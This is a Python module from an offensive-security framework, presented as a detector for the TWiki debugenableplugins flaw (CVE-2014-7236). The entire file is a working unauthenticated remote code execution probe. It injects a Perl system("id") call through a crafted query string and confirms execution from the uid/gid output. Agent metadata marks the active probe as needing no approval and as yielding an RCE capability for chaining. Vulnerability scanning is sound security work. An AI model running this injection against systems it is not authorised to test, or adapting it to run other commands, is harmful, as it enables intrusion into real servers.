#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TWiki debugenableplugins RCE (CVE-2014-7236)."""

import re
from urllib.parse import quote

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TWiki - debugenableplugins RCE Detection (CVE-2014-7236)',
        'description': (
            'Detects CVE-2014-7236 by injecting Perl system(id) via '
            'debugenableplugins on /view/Main/WebHome.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'twiki', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-7236',
        ],
        'cve': 'CVE-2014-7236',
    }

    def run(self):
        inj = (
            'BackupRestorePlugin;print("Content-Type:text/html\\r\\n\\r\\n");'
            'print(system("id"));exit'
        )
        q = '?debugenableplugins=' + quote(inj, safe='')
        for base in ('', '/twiki', '/wiki'):
            path = f'{base}/view/Main/WebHome{q}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='TWiki debugenableplugins RCE (CVE-2014-7236)',
                    path=f'{base}/view/Main/WebHome',
                )
                return True
        return False
